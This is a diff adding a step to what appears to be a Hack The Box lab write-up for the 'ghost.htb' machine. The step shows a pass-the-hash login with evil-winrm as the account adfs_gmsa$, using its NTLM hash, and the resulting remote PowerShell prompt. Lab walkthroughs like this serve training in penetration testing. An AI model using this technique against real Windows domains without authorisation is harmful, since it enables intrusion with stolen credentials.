@@ -869,3 +869,20 @@ SMB         10.129.231.105  445    DC01             [+] ghost.htb\adfs_gmsa$:55e
 
 This user is now compromised
 
+# Access on WINRM as `adfs_gmsa$`
+
+```python
+evil-winrm -i dc01.ghost.htb -u adfs_gmsa$ -H '55eea5db159b96bcb1d335d6e5738ea6'
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents>
+```
+
+I now have access as this user
+
